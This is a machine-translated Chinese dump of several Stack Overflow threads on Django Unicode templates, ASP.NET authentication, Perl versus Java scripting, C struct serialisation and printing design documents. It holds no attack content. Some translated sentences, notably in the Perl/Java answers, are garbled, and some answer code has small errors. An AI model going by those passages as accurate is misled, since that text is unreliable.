我在使用 {% ifequal s1 "some text" %} 将字符串与 Django 模板中的扩展字符进行比较时遇到问题。当字符串 s1 包含 >127 的 ascii 字符时，我在模板渲染中遇到异常。我究竟做错了什么？我在数据、模板和 Python 代码的其余应用程序中使用 UTF-8 编码，没有任何问题。

视图.py

```
def test(request):
    return render_to_response("test.html", {
                                            "s1": "dados",
                                            "s2": "aprovação",
                                            }
                              ) 
```

测试.html

```
s1={{s1}}<br>
s2={{s2}}<br>

{% ifequal s1 "dados" %}
  s1="dados" is true
{% endifequal %}

{% ifequal s1 "aprovação" %}
  s1="aprovação" is true
{% endifequal %}

{% comment %}
The following two comparions cause the following exception:
Caught an exception while rendering: 'ascii' codec can't decode byte 0xc3 in position 6: ordinal not in range(128)

{% ifequal s2 "dados" %}
  s2="dados" is true
{% endifequal %}

{% ifequal s2 "aprovação" %}
  s2="aprovação" is true
{% endifequal %}
{% endcomment %}

{% ifequal s2 u"dados" %}
  s2="dados" is true
{% endifequal %}

{% comment %}
The following comparison causes the following exception:
Caught an exception while rendering: 'ascii' codec can't encode characters in position 8-9: ordinal not in range(128)
{% ifequal s2 u"aprovação" %}
  s2="aprovação" is true
{% endifequal %}
{% endcomment %} 
```

输出

```
s1=dados
s2=aprovação
s1="dados" is true 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-01-27T17:29:17.833

有时没有什么比向其他人描述问题来帮助您解决问题更重要的了。:) 我应该像这样将 Python 字符串标记为 Unicode，现在一切正常：

```
def test(request):
    return render_to_response("test.html", {
                                            "s1": u"dados",
                                            "s2": u"aprovação",
                                            }
                              ) 
```

# jquery - 使用第三方 javascript 库的 ASP.NET 表单身份验证

> ID：484345
> 
> 赞同：0
> 
> 时间：2009-01-27T17:25:12.367
> 
> 标签：jquery, wcf, json, asp.net-membership, mootools

我有一个网站，我目前使用 ASP.NET 的内置身份验证、配置文件和角色管理。我想使用第三方 javascript 库（如 JQuery 或 Mootools）将一些功能（包括身份验证）移动到客户端，而不使用 ScriptManager 和生成的代理类。

关于这个主题的信息非常有限，但我设法找到了这篇[文章](http://ajax.sys-con.com/node/581103)，它创建了一个 WCF 身份验证端点以与 SilverLight 应用程序一起使用。我找不到有关如何将 WCF 身份验证端点与第三方 javascript 库和 JSON 一起使用的任何信息。

如果您有任何链接或信息，请告诉我。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-01-27T17:31:14.350

您可能正在为此寻找资源而苦苦挣扎，因为将您的身份验证控制放在客户端是不安全的。

您想要这样做的原因是什么？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-27T17:55:39.280

谢谢你的回复。

你可能是对的，但我在很多网站上都看到了这个功能。我基本上允许您从任何页面登录您的帐户，而无需离开它。

我找到了[一篇](http://weblogs.asp.net/asptest/archive/2008/e-12/09/working-with-thasp-net-ajax-authentication-service.aspx)关于如何通过在代码中添加脚本管理器服务器标记来完成此操作的文章。但是，如果可能的话，我想远离任何自动生成的代理类，并使用 JSON 来完成。

# java - 用 java 重写 Perl 和 shell 脚本有意义吗？

> ID：484355
> 
> 赞同：16
> 
> 时间：2009-01-27T17:28:19.100
> 
> 标签：java, perl, shell

我有一堆脚本——一些在 perl 中，一些在 bash 中——用于：

*   创建数据库（表、索引、约束、视图）
*   解析电子表格并将数据加载到数据库中
*   获取有关一堆文件的信息并将其加载到
    数据库中。

这些脚本与用 java 编写的更大的应用程序结合使用，我的经理要求我用 java 重写脚本。他的理由是，如果全部使用一种语言，那么使用、移植、管理、理解和支持会更容易，而且太多的单独部分是一个设计问题。

我最初的反应是，这是一个坏主意。脚本非常简洁和快速，并且在脚本中微不足道的任务 - 例如使用正则表达式查找和替换无效值 - 在 java 中完成时会更加冗长并且很可能更慢。

这些脚本的一个缺点是，当它们在 Windows 上运行时，它们需要 cygwin 才能运行。因此，我想提出一个相反的建议，即我将所有 bash 脚本移植到 perl，以便它们可以在没有 cygwin 的 Windows 上运行，并且我花时间组织和记录脚本。

问题是“直觉反应”类型的反应不足以说服我的经理。我来自 linux 背景，他来自 Windows，我们有一些经典的 linux 与 windows 在方法上的差异。

所以我有两个问题：

1.  我的“直觉反应”正确吗？对于数据库管理、电子表格解析和文件处理任务，Java 是否更慢、更冗长且更难维护？
2.  如果第一个问题的答案是肯定的，那么陈述我的案例的最佳方式是什么？

* * *

编辑：感谢大家的见解。我想澄清一下：脚本不是隐藏在混淆脚本中的成熟应用程序。在大多数情况下，它们是手动完成的任务，我通过脚本自动完成，后来随着需求的发展进行了修饰。我使用脚本语言而不是 java 开始的原因是因为这些任务在脚本*中*更容易完成。例如，一个脚本运行一堆查询、格式化结果并将它们输出到文件中。您认为在 java 中需要多少 LOC 才能做到这一点？

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2009-01-27T17:36:23.793

问题是，你的直觉反应可能是对的，但这并不意味着你的经理一定是错的——他可能有很好的理由希望这一切都在 java 中完成。尤其是，如果你在公共汽车下，找到一个懂 java、perl 和 bash 的替代者将比找一个懂 java 的人困难得多。这撇开了“它们只能在安装了 cygwin 的 PC 上运行”的问题。而且很可能，性能并不像您想象的那么大。

话虽如此，您最好的选择是花一点时间估计将它们全部移植到 java 所需的时间，以便他做出明智的决定。并且，当您使用它时，估计将 bash 脚本移植到 perl**并**记录它们需要多长时间。然后让他决定。记住——他不会像你那样把大部分时间都花在编码上，所以他可以做出一些决定是公平的。

如果他决定继续使用 java 选项，尽可能移植其中一个脚本，然后报告两个版本，如果你对 perl/bash 脚本的简洁性是正确的，你应该能够从并排检查两个版本中获得一些里程。

**编辑：** MCS，老实说，在我看来，这些脚本在 perl 和/或 bash 中实现得更好，而不是在 java 中，但这并不是重点——重点是你如何向你的经理证明这一点。如果你解决这个问题，你就解决了“直觉反应”问题（顺便说一句，这里有一个提示 - 开始将你的直觉反应称为“基于经验的判断”）和“陈述我的案例的最佳方式”问题。

现在，您必须意识到的第一件事是，您的经理（可能）不会走这条路只是为了惹恼您。他几乎肯定对这些剧本有真正的担忧。鉴于他们可能是真正的担忧（如果他们不是，那就没有必要再进一步了——如果他出于某种政治原因下定决心做这件事，那么无论如何你都不会改变他的想法什么，所以继续它并将其添加到您的简历中）因此，如果您要去任何地方，您需要向他提供解决他的担忧的信息。如果你能做到这一点，那么你就成功了一半以上。

那么，他的顾虑是什么？根据您的帖子，以及我的判断和经验 :-) 我会说他们是：

*   可维护性
*   就是这样，只是可维护性

我也猜想他的担忧**不是**：

*   表现

当然，最后一个我可能是错的。在我工作的最后一个地方，我们遇到了与复制有关的 SQL Server 性能问题，它影响了企业提供客户支持的能力，所以性能是一个问题，所以我们解决了这个问题。但一般来说，性能并不像程序员想象的那么严重。如果他真的告诉过你性能是一个问题，那就把它考虑进去。但如果他没有提到，那就忘了它 - 可能只有你认为这些脚本在 perl/bash 中的运行速度比它们在 perl/bash 中的运行速度更快。 Java 很重要。

所以，可维护性。这归结为回答“如果 MCS 落在公共汽车下，谁来维护这些脚本？”这个问题。和补充问题“这会给我（即你的经理）带来问题吗？” （顺便说一句：不要被整个公共汽车的事情挂断。“跌倒在公共汽车下”是各种风险的有用且外交的简写，例如“如果有人用我公司无法提供的薪水引诱他离开会发生什么匹配？”、“如果他决定移民到百慕大会怎样？”、“如果我想解雇他会怎样？”、“如果我想提拔他会怎样？”当然还有“如果只是因为某种未知的、可能与公共汽车有关的原因，他有一天不再上班了吗？”）

请记住，考虑和减轻这些风险是您经理的工作。

那么，该怎么做呢？

首先，演示这些脚本的实际可维护性。或者至少它们的可维护性如何。记录它们（在适当的文档中，而不是在代码中）。培训一个同事来维护它们（选择一个想要获得/提高他们的 perl 和 bash 技能的人，以及你的经理信任的人）。重构它们以使它们更具可读性（必要时牺牲性能和巧妙的脚本技巧）。如果您想继续使用 bash，请创建一个文档，提供安装 cygwin 和 bash 的分步说明。无论如何，记录安装 perl 和运行脚本的过程。

其次，选择其中一个脚本并将其移植到 java。随意选择最能展示 perl/bash 相对于 java 的优势的脚本，但**尽你所能移植它。**使用 java.util.regex 做你在 perl 中做的同样聪明的事情。将其记录为记录其他内部 java 实用程序的标准。如果性能实际上是一个因素，请测量其相对于 perl/bash 脚本的性能。

第三，在经历了那个练习之后，对自己诚实地对待它们的相对可维护性。问问你训练的那个人他的想法。如果您仍然认为 perl/bash 脚本或多或少与 java 版本一样可维护，请尽可能准确地估计将剩余脚本移植到 java 所涉及的工作（您现在可以非常准确地做到这一点，因为你实际上已经移植了一个）。然后将比较脚本、文档和估计（以及性能数据，如果合适的话）交给你的经理，并与他一起检查。提出您的反建议（a. 将它们保留在 perl 和 bash 中，但记录它们并培训一位同事，以及 b. 将 bash 脚本移植到 perl，记录它们并培训一位同事）。

最后，让您的经理权衡所有信息并做出决定，并遵守他的决定。事实上，不要只是遵守他的决定，要接受他可能是对的事实。仅仅因为你比他更了解 perl/bash/java 并不意味着你一定比他更了解管理团队/部门。如果他的决定是坚持使用 perl/bash，或者移植到 perl，那就高兴吧！因为你不仅走上了自己的路，而且你的经理对你的评价也有所提高，并在此过程中学到了宝贵的一课。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2009-01-27T18:51:44.733

这取决于。我发现 Java 中的文本处理可能占用 Perl 中的代码量的 8 或 9 倍。如果这些脚本需要紧密集成到应用程序中，那么我会同意您的经理的意见，但如果只有后台任务，我会考虑在 Windows 上使用 ActiveState 并在 Perl 中重写 bash 脚本。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2009-01-27T17:41:26.390

就我个人而言，我发现使用 java 更难进行 db、文件管理，但一旦编写它们可能更容易维护。

但是这值得吗？如果它有效，请不要“修复”它。

就我个人而言，我不在乎 - 如果我有工作要做，我会与我的经理讨论利弊，如果她坚持，我就会去做并获得报酬。不过，通常她会醒悟过来，让我做更重要的工作。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2009-01-27T18:13:41.270

我觉得你的第一反应是对的。一个论点是*如果它有效，就不要“修复”它。*另一个论点是，一个开发人员可以独立于所使用的语言编写几乎相同数量的 SLOC。如果您知道 Java 是如何冗长的，这听起来很奇怪，但是想想您必须多么仔细地设计您的 Java 代码才能使用 perl 特性（如闭包、动态生成代码、即时正则表达式等）获得相同的结果。而现在，当 Java 与 Perl 的 SLOC 比率与相同结果的比率超过 10:1 时。您必须阅读、理解和维护的每一行代码。Java 更快。是的。对于某些人来说，Java 在数字运算和某种文本处理方面更快。Perl 在正则表达式和其他一些文本处理方面速度更快，而且通常比 Java 更高效。如果按 SLOC 比较，Perl 的可维护性较差，但如果按功能比较，则与 Java 相同或更好。

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2009-01-27T17:42:33.563

我当然同意，如果您使用大多数人都知道的一组工具，那么对每个人来说都会更容易。但是，由于您同时拥有 Java 和 Perl 代码，我假设至少你们中的一些人都知道这两者，因此老实说，我不认为同时拥有 Java 和 Perl 代码有什么大问题。

如果 Perl 脚本按预期工作并且可以维护，我不会花时间用 Java 重写它们。在 Perl 中编写脚本比在 Java imo 中容易得多，所以除非你真的需要转换，否则我看不出重点。我宁愿把时间花在真正为你所做的事情增加价值的事情上。

您说脚本需要 cygwin 才能运行。我在 Unix/Linux 和 Windows 上都做了很多 Perl，除非你在做很多特定的 Unix 东西，否则我的经验是脚本可以很容易地转换为在 ActiveState 这样的 Windows Perl 下运行。在您的情况下，这可能是一个选择。

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2009-01-27T18:20:37.980

根据我自己的经验（包括在一个系统中混合 Java 和 Perl），我建议如下：

1）“Java 速度较慢”不一定是真的，但也无关紧要（即使是真的），除非额外的运行时间会干扰某些时间关键的工作流程。

2) 长期可维护性是一个合理的问题。例如，拥有一个不必以两种语言维护的单一 DAO 层可以从长远来看得到回报。您需要修改多少 Java 代码和当前脚本（两次）才能涵盖数据库中的重构？

3) 如果您确实偏爱轻量级符号，但您的经理想要 Java，您是否可以在 Java 库（从前一点）与在 JVM 上运行并且可以共享使用的可互操作的类脚本语言之一妥协您为例如数据库访问编写的标准库？我正在考虑 JRuby-Groovy-Scala-Jython 范围内的一些东西。

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2009-01-27T18:28:16.640

总的来说，我理解您的经理希望在您的环境中使用的不同语言/平台上最小化和标准化。

但是，在*某些*任务上，脚本语言比 Java 之类的语言更适合。如果你觉得你被要求重写的脚本就是这种情况，也许不是建议使用 Perl 作为这个特定任务的一次性语言，你可以建议采用 Perl（或其他脚本语言，如果你认为你会获得更好的支持）作为脚本任务的“支持”语言。

也就是说，根据您所说的“结合使用”的含义（即不同位的紧密耦合程度），可能只是将这些任务写成 Java 库更有意义，以便由应用程序的其余部分。

* * *

## 回答 #8

> 赞同：5
> 
> 时间：2009-01-28T17:17:27.437

## 转换为所有`Perl`

您认为那是较慢`Java`的权利。的变体经历了许多变化，以确保它尽可能快。`Regexp``Perl``Regexp`

从`BASH`to转换`Perl`应该证明很容易完成，`Perl`可以轻松地做你正在做的事情`BASH`。

通过摆脱`BASH`文件，您也可以摆脱 Cygwin。

* * *

## 回答 #9

> 赞同：4
> 
> 时间：2009-01-27T17:45:03.497

他们应该重写吗？那要看。你的老板最有力的论据是应用程序的其余部分是用 Java 编写的，听起来这可能是组织的发展方向。减少组织必须支持的不同语言的数量实际上是一个非常明智的长期决定。我知道，我知道，正确的工具适合正确的工作，但从成本的角度来看，完全有可能让组织花费更多的钱来聘请既了解 PERL 又了解 JAVA 的人，而不仅仅是 Java。即使脚本很漂亮，它们仍然必须得到支持，这意味着他必须至少保留一个知道如何做到这一点的员工。这是他（和组织）在一天结束时必须担心的另一件事。

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2009-01-27T17:50:58.493

我明白你在说什么，但简短而简洁并不总是可以维护的——有时冗长和明确是可以维护的。

此外，一旦全部使用 Java，您将更有可能获得 UI/控制台的感觉，这可能是一种改进。

如果你真的喜欢脚本语言的感觉，也许你可以反对 groovy。它的语法对于 Java 程序员来说很容易上手，并且 100% 兼容 java（包括在 groovy 等中扩展 java 类），但它是一种脚本语言——与任何语言一样强大——具有所有功能且无需编译这意味着。

顺便说一句，Java 可以很好地处理正则表达式。

顺便说一句，如果您编写了所有这些脚本并且是唯一熟悉它们的人，您可能想开始四处寻找新工作。很抱歉，但要求您将“特殊小技巧”记录在案且可维护通常是他们直到裁员前才考虑的事情。

* * *

## 回答 #11

> 赞同：3
> 
> 时间：2009-01-29T15:11:28.323

**照你说的做：将你的 shell 转换为 Perl 并记录它**

您提到的代码似乎不是应用程序的一部分，它似乎是“设置”代码或“维护”代码。作为一个答案通知，“一份工作=一种工具”：

*   对于您的应用程序，它是 Java，
*   用于打包您的应用程序，它是 ant 或 maven 或 make，
*   用于设置环境，填写数据库，从日志中生成报告，它是一种脚本语言（Perl、Python、shell）。

说服你的老板：

1.  [http://en.wikipedia.org/wiki/Golden_hammer](http://en.wikipedia.org/wiki/Golden_hammer)
2.  从一种语言迁移到另一种语言是有风险的：您必须花费大量时间来检查回归错误
3.  根据我的经验，一行 Perl = 20 行 Java（试一试：迁移一个 Perl 脚本）。所以代码库将乘以 20，而要维护的代码越多，就越让人头疼
4.  Perl 在同一个地方（cpan.org）维护它的所有模块和文档。对于 Java，没有“参考点”。您将不得不在网上浪费时间在 java 电子表格解析器之间做出选择，学习使用它（希望文档没问题），并制作一些 java-cryptic-glue-code：

    SheetHolder = ParserFactory .newInstance(Configuration.asProperties()) .parse(SheetReader.asStream());

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2009-01-27T18:39:57.707

就一点。在很多方面，他都有道理，但是...

Perl（或 bash 脚本）是一种胶水语言。它是坚持系统并使它们更好地工作的最佳语言之一。Perl 是一种完全解释的语言，它为运行时代码重写和更动态的编程风格提供了强大的功能。您可以将 perl 代码块作为数据传递，并在您对字符串调用“eval”之前对其进行修改。无论是否有嵌入 perl 的本机 java 功能，您都可以轻松地自己创建这样的嵌入，从而构建一个非常强大的系统。

您可能想向您的主管说明，如果您删除 perl，您将失去什么潜力。在我的上一份工作中，两个开发人员将 IronPython 添加到了我们的“法律语言列表”中，这样​​我们就可以实现库并轻松地将它们通过数据库进行大规模自动化项目，这个项目变成了一个非常简单、非常小的项目，用一堆python代码粘合并粘合到已编译的模块上。

总而言之，有时一百万行 Java 无法完成 10 行 Bash 脚本所做的事情。那是你想要使用它的时候。其余的时间，你的老板是对的，只要你有时间去做。

* * *

## 回答 #13

> 赞同：2
> 
> 时间：2009-01-27T23:18:07.117

如果你建造一个棚子并在 80-90% 的时间里使用锤子，那么你是否应该只使用锤子来建造棚子？不，您对工作的每个部分都使用最合适的工具，就像您所做的那样！

近年来，IT 员工的平均技能/经验水平也有所提高。例如，这个[SO 民意调查](https://stackoverflow.com/questions/327973/how-old-are-you-and-how-old-were-you-when-you-started-coding-closed)显示中等 SO 程序员年龄在 30 多岁，拥有超过 10 年的经验。

你的老板招聘具有广泛技能和经验的程序员是没有问题的。

* * *

## 回答 #14

> 赞同：2
> 
> 时间：2009-01-28T08:39:13.177

你考虑过蚂蚁吗？我不得不承认我从未尝试过，但一直想将我的脚本移植到 Ant。文件操作很简单，甚至还有创建 SQL 语句的任务。当然，如果您的脚本更像程序，即许多循环结构，那么这不是要走的路。只是一个建议。

* * *

## 回答 #15

> 赞同：2
> 
> 时间：2010-03-07T12:48:23.307

在过去的一个项目中，Perl 代码被移植到 Java，从而显着提高了速度。该公司主要有 Java 程序员，我们的工具 Eclipse、Ant、JUnit 和 Maven 不适合 Perl 开发。我在很多公司都看过 Perl 代码，但大多数时候它只是作为临时解决方案、快速修复、原型、演示等。重写是有意义的，但你应该逐案查看，有时时间或人力不允许。

* * *

## 回答 #16

> 赞同：1
> 
> 时间：2010-09-29T06:44:51.157

请记住，Java 并不是唯一的 JVM 语言——也许像[Groovy](http://groovy.codehaus.org/)或[Jython](http://www.jython.org/)这样的语言会是一种让每个人都满意的折衷方案。

* * *

## 回答 #17

> 赞同：1
> 
> 时间：2010-11-23T19:39:00.870

“为了操作文件和移动东西，你需要操作系统在你身边”

在不了解正确上下文的情况下小心遵循此建议！

该操作系统支持编程 API，如 man (2) 和 (3) 以及用户命令 man (1)。

例如，让 Perl 脚本驱动一系列 man(1) 不会像 JVM 有效地发出 man(2) 或 man(3) 序列一样快。

考虑这个例子：

在我加入的公司，我发现他们有一个循环调用 Java 实用程序的 Perl 模块——这是 make/perl/java 混合构建装置的一部分。

从表面上看，让 perl 读取元数据并在 JVM 中执行/调用来完成繁重的工作（在 perl 循环中合并文件的专有形式）一定是合理的。

这种多进程方法的开销（安装/拆卸）非常显着，在 Windows 操作系统下尤其糟糕。

必须解决性能问题。

团队通过将 java 程序托管在 servlet 中并创建协议以将命令从 perl 发送到 java servlet 来“重用”java 程序来处理性能问题。现在，循环中的迭代 JVM 设置/拆卸减少了，每个人都很高兴，直到出现诸如超时问题之类的边缘用例，团队在混合中添加了睡眠。

这种文化鼓励工具团队使用 perl，服务团队使用 Java。用 Java 替换 perl 并消除所有开销的最佳方法要么是每个人都丢失了，要么是政治力量影响了 rube-goldberg 解决方案......

使用 ANT 或 Maven 等 JVM 语言进行构建可以避免这一切。

再次警告:-)

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2017-07-22T14:19:46.647

这已经是很多年之后的事了，但我刚刚用一些 Perl 脚本转换了 bash 脚本。我将系统重写为 Java 应用程序，还添加了 Groovy。Java 和 Groovy 可以很好地协同工作。

*   groovy 运行纯 java 代码。
*   我可以在 groovy 中访问和操作我所有的 java 对象/结构/数据。我调用 groovy 脚本来操作我正在运行的 java 程序中的数据。
*   groovy 有一些很好的简写语法。我可以很容易地打开一个文件并用一个衬垫写入它。
*   groovy 也有一些简短的正则表达式语法。
*   groovy 脚本文件是在运行时解释的，所以当我的 java 程序仍在运行时，我可以更改我的 groovy 脚本代码，下次调用文件时它会使用新代码。

* * *

## 回答 #19

> 赞同：-1
> 
> 时间：2009-01-27T17:33:47.590

> 我的“直觉反应”正确吗？对于数据库管理、电子表格解析和文件处理任务，Java 是否更慢、更冗长且更难维护？

不。

看起来您的经理正在委派错误的人来执行此操作。很明显，您不习惯编写 Java，而且您不应该这样做。为什么“java 端”的一位开发人员不帮助您？

* * *

## 回答 #20

> 赞同：-4
> 
> 时间：2009-01-27T17:48:43.583

对我来说，这取决于 Perl 写得有多糟糕（我从未见过 Perl 我会说写得“好”），以及你是否需要阅读 Perl。

Perl 通常是一种只写一次，永不阅读的语言。如果一切正常，并且您不太可能需要更改它，我会说不要碰它。

# c - 试图将结构成员复制到c中的字节数组

> ID：484357
> 
> 赞同：10
> 
> 时间：2009-01-27T17:29:16.697
> 
> 标签：c, arrays, serialization, struct, memcpy

我试图将包含整数、字符和字符数组的结构的成员复制到字节数组中以发送到串行线路。到目前为止我有

```
struct msg_on_send
{
    char descriptor_msg[5];
    int  address;
    char space;
    char cmdmsg[5];
    char CR;
    char LF;
};

void switch_output_on()
{
    int member;
    struct msg_on_send SendMsg_on[sizeof member] =
     {

    };
    unsigned char buffer [ sizeof SendMsg_on[0] ];
    showbytes(buffer, serialize(buffer, SendMsg_on));
}

/*************************************************************************** 
*   Function:   ArrayBuild                                                 *
*   Purpose:    Uses memcopy to transfer the struct members sequentially   *
*               into an array of char                                      *
*   Arguments:                                                             *
*   Returns:    size_t i = a count of the number of bytes in the array     *
***************************************************************************/    

size_t ArrayBuild(unsigned char *dst, const struct msg_on_send *object)
{
    size_t i = 0;

    memcpy(&dst[i], &object->descriptor_msg, sizeof object->descriptor_msg);
    i += sizeof object->descriptor_msg;

    memcpy(&dst[i], &object->address, sizeof object->address);
    i += sizeof object->address;

    memcpy(&dst[i], &object->space, sizeof object->space);
    i += sizeof object->space;

    memcpy(&dst[i], &object->cmdmsg, sizeof object->cmdmsg);
    i += sizeof object->cmdmsg;

    memcpy(&dst[i], &object->CR, sizeof object->CR);
    i += sizeof object->CR;

    memcpy(&dst[i], &object->LF, sizeof object->LF);
    i += sizeof object->LF;

    return i;
}

/*********************************************************************** 
*   Function:   USARTWrite                                             *
*   Purpose:    Writes the array data to the USART data register       *
*   Arguments:  void *object = struct member                           *
*               size_t size =  size of array remaining                 *
*   Returns:    None                                                   *
***********************************************************************/

void USARTWrite(const void *object, size_t size)        
{
    const unsigned char *byte;
    for ( byte = object; size--; ++byte )
    {
        printf("%02X", *byte);
    }
    putchar('\n');
} 
```

当我获得此代码时，我并不完全理解它是如何工作的。我可以看到 memcpy 获取结构的每个元素并将其转换为由“i”变量索引的串行流，但我不知道 USARTWrite 函数如何将其打包成字符串，或者如何加载数组我的结构初始化。

抱歉，这篇文章有点长，但我刚刚开始这个编程云雀，并试图理解这个概念。

谢谢戴夫

编辑：

哇，很快就有很多好的答案 - 谢谢大家。

slaz：这对我来说似乎是合乎逻辑的，我还没有真正考虑过这种方法，因为我还没有真正理解指针，但是我开始看到它们是 C 的重要组成部分，所以我会适时拥有看看。

*   这行代码将数据发送到我的 UART，我将用什么替换包含消息内容的数组？似乎我在这里错过了一个逻辑步骤，我有一个变量告诉我我的结构从哪里开始以及它有多大，但没有要发送的数组

    ```
    USART_SendData(USART1, message_on_contents[array_count]); 
    ```

哈珀谢尔比：谢谢你的描述，这让我更清楚了。

rgds

戴夫

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-01-27T18:13:39.117

您不必实际将结构复制到字节数组中。您可以选择这样做：

```
struct msg_on_send myMessage;

// code to set myMessage to whatever values...

// get a byte pointer that points to the beginning of the struct    
uint8_t *bytePtr = (uint8_t*)&myMessage;

// pass that into the write function, and it will write the amount of bytes passed in
USARTWrite(bytePtr, sizeof(myMessage)); 
```

指针的威力！:)

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2009-01-28T22:50:03.037

抱歉，直到现在我才看到你的评论。下面的代码在 Linux 上编译得很好，所以我希望它对你有用。
printf() 以十六进制打印，每个字节将得到 2 个字符。

```
#include <stdio.h>

struct msg_on_send
{
char descriptor_msg[5];
int  address;
char space;
char cmdmsg[5];
char CR; 
char LF; 
};

void USARTWrite(const void *object, size_t size)    
{
    const unsigned char *byte;
      for ( byte = object; size--; ++byte )                                     
      {   
          printf("%02X", *byte);
      }   
      putchar('\n');
}

int main (int argc, char**argv)
{
    struct msg_on_send myMsg;
    unsigned char* ptr= (unsigned char*)&myMsg;

    USARTWrite(ptr, sizeof(myMsg));

    return 0;
} 
```

我希望这有帮助。

~~
_

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-27T17:50:26.747

这相当简单： 1\. ArrayBuild 接受一个指向 msg_on_send 结构的指针，并且对于其中的每个成员，使用 memcpy 将字节复制到传入的 char 数组中，如下所示 -

```
char byteArray[17]; // This assumes 4-byte ints
                    // be careful though, the length *must* be long enough, or 
                    // Bad Things will happen
size_t msgSize; // Holds the size of the message built by ArrayBuild,
                // passed to USARTWrite
struct msg_on_send myMessage;
// Code to fill up myMessage appropriately

msgSize = ArrayBuild(byteArray, &myMessage); // need the & to pass a pointer as required

USARTWrite(myMessage, msgSize); 
```

USARTWrite 只给出了一个字符数组和一个大小 - 它依次抓取每个字符并使用 printf() 将其作为十六进制值打印到屏幕上。

'魔法'在 ArrayBuild 中——memcpy 执行从源到目标的字节字面副本，没有翻译。假设 4 字节整数，该函数构建的数组将如下所示：

```
 1 1 1 1 1 1 1 
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6
|   A     |   B   |C|    D    |E|F|

A = descriptor_msg (char[5])
B = address (int)
C = space (char)
D = cmdmsg (char[5])
E = CR (char)
F = LF (char) 
```

我假设在“真实”应用程序中，printf() 调用将被对串行端口写入的调用所取代。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2010-02-08T18:56:07.820

如果我想将结构视为字节数组，我通常使用联合将结构与字节数组组合。例如：

```
typedef union
{
    struct
    { 
        char descriptor_msg[5]; 
        int  address; 
        char space; 
        char cmdmsg[5]; 
        char CR; 
        char LF; 
    };
    BYTE bytes[];
} msg_on_send; 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2018-03-27T11:18:20.123

完整的示例。完美的作品。在 X-CODE 9 Objective-C 下测试

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct Person
{
    char name[20];
    int age;
};

int main()
{
    //structure variable declaratio with initialisation
    struct Person person={"Deniss Ritchie", 60};
    //declare character buffer (byte array)
    unsigned char *buffer=(char*)malloc(sizeof(person));
    int i;

    //copying....
    memcpy(buffer,(const unsigned char*)&person,sizeof(person));

    //printing..
    printf("Copied byte array is:\n");
    for(i=0;i<sizeof(person);i++)
        printf("%02X ",buffer[i]);
    printf("\n");

    //freeing memory..
    free(buffer);
    return 0;
} 
```

输出：

```
Copied byte array is:
44 65 6E 69 73 73 20 52 69 74 63 68 69 65 00 00 00 00 00 00 3C 00 00 00 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-27T17:44:48.740

你`struct`这里只是字节数组，它不包含指向它的指针。

成员到成员的复制最有可能执行以应对对齐，因为`(char*) &address`可能大于`((char*) &descriptor_msg) + 5`.

`USARTWrite`将`HEX`结构字节的代码发送到`stdout`，但放弃对齐。使用不同的对齐策略编译此代码将导致不同的输出。

将您的结构声明附入`#pragma pack(push, n)`并`#pragma pack(pop)`强制对齐，并且只需逐字节复制您的结构。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2021-05-14T10:55:30.733

一个很好的解决方案：

```
typedef union
{
  unsigned char byte_array[14];
  struct
  {
    uint8_t descriptor_msg[5];
    uint8_t address;
    uint8_t space;
    uint8_t cmdmsg[5];
    uint8_t CR;
    uint8_t LF;
  };
} msg_to_send_t;

#define ARRAY_OF_5_BYTE {0x00, 0x01, 0x02, 0x03, 0x04}

#define MSG_TO_SEND_DEFAULT \
{ \
   .descriptor_msg = ARRAY_OF_5_BYTE, \
   .address = 0x01, \
   .space = 0x02, \
   .cmdmsg = ARRAY_OF_5_BYTE,\
   .CR = 0x03, \
   .LF = 0x04, \
} 

msg_to_send_t msg = MSG_TO_SEND_DEFAULT;

for(i=0; i<sizeof(msg.byte_array); i++)
    printf("%02x", msg.byte_array[i]);
printf("\r\n"); 
```

# language-agnostic - 您是否打印要求、设计文档和代码的硬拷贝？

> ID：484367
> 
> 赞同：0
> 
> 时间：2009-01-27T17:31:07.067
> 
> 标签：language-agnostic, printing, requirements

我喜欢打印出软件需求，这样我就可以轻松地标记它们、绘制 UI 等。

您**是**提前打印出需求和设计材料还是仅以数字方式查看它们？

什么功能造就了理想的“程序员”打印机？

*   激光还是喷墨？
*   黑白还是彩色？
*   USB 或以太网连接器？
*   双工？
*   通用墨盒或碳粉的可用性？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-27T17:45:40.780

是的，Network B&W Laser - 主要是这样我可以有很多现成的东西，这些东西并不完全适合我的显示器，尤其是用 graphviz 生成的多页图表，以及任何需要注释的东西。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-27T17:33:45.703

我们经常在我们的标准办公室打印机上打印这些东西……通常是通过带有“如果打印过时”标记的 FinePrint（2 页到一页）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-27T17:34:52.130

一台黑白激光对我来说就足够了，我打印出大部分需求文档、类图和 ER 图……

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-27T17:35:25.590

我通常不会打印出要求或其他文档，除非我需要在工作时对其进行标记。说要检查我已经实现了所有要求等。

我对一台普通的 LaserJet 打印机没问题。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-27T17:36:26.447

*我经常在我认为*我已经完成后打印出分析文件给他们一次。从印刷版阅读后，我几乎总是会注意到其他东西。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-01-27T17:38:12.527

我喜欢打印它们，这样我就可以在它们上面画画和写字。

